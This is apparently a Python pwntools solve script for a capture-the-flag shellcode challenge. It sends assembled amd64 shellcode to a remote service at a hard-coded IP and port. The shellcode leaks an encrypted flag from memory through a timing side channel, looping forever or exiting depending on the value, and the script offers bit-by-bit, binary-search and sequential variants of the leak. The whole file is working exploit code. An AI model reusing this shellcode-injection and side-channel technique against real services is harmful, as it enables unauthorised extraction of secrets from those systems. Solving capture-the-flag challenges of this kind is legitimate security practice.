from pwn import *
import time
import string

context.log_level = 'critical'
def check_bit():
    flag = 'ISITDTU{'
    for addr in range(0xcafe008, 0xcafe030, 8):
        print(hex(addr))
        for i in range(0,8):
            binary_char=0
            for brute_bit in range(0,7):
                #p = process('./babyshellcode')
                p = remote('13.229.224.69', 2222)
                print(chr(binary_char),end='\r')
                shellcode = asm("""
                    mov rax, qword ptr [0xcafe000]
                    mov rbx, 0x7b55544454495349
                    xor rax, rbx
                    mov rbx, qword ptr [%d]
                    xor rax, rbx
                    shr rax, %d
                    shr al, %d
                    and al, 1
                    cmp al, 1
                    jne quit
                    loop:
                        jmp loop
                    quit:
                        xor al,al 
                        syscall
                """% (addr ,8*i ,brute_bit ), arch="amd64"
                )
                p.sendline(shellcode)
                if not p.can_recv(1):
                    binary_char+= 2**brute_bit
                p.close()
            flag+=chr(binary_char)
            print(flag)

            
def check_mid(addr, i, mid):
    p = remote('13.229.224.69', 2222)
    shellcode = asm("""
        mov rax, qword ptr [0xcafe000]
        mov rbx, 0x7b55544454495349
        xor rax, rbx
        mov rbx, qword ptr [%d]
        xor rax, rbx
        shr rax, %d
        cmp al, %d
        ja quit
        loop:
            jmp loop
        quit:
            xor al,al
            syscall
    """% (addr ,i*8 , mid), arch="amd64"
    )
    p.sendline(shellcode)
    if not p.can_recv(1):
        p.close()
        return 1
    return 0
def binary_search():
    flag = 'ISITDTU{'
    for addr in range(0xcafe008, 0xcafe030, 8):
        print(hex(addr))
        for i in range(0, 8):
            low= 32.0
            high= 127.0
            while 1:
                mid = (low+high)/2
                #print(high)
                #print(mid)
                #print(low)
                #print("------------")
                if high <= low :
                    flag+=chr(round(low))
                    print (flag)
                    break
                elif check_mid(addr, i, mid):
                    high = (mid-0.5)
                else:
                    low = (mid+0.5)
                


def check_seq():
    flag = 'ISITDTU{'
    for addr in range(0xcafe008, 0xcafe030, 8):
        print(hex(addr))
        for i in range(0, 8):
            for ascii_chr in range(32,127):
                #p = process('./babyshellcode')
                p = remote('13.229.224.69', 2222)
                print(chr(ascii_chr),end='\r')
                shellcode = asm("""
                    mov rax, qword ptr [0xcafe000]
                    mov rbx, 0x7b55544454495349
                    xor rax, rbx
                    mov rbx, qword ptr [%d]
                    xor rax, rbx
                    shr rax, %d
                    cmp al, %d
                    jne quit
                    loop:
                        jmp loop
                    quit:
                        xor al,al
                        syscall
                """% (addr ,i*8 , ascii_chr), arch="amd64"
                )
                p.sendline(shellcode)
                if not p.can_recv(1):
                    flag+=chr(ascii_chr)
                    print(flag)
                    p.close()
                    break
                p.close()
                
                
            
#check_bit()
#check_seq()
binary_search()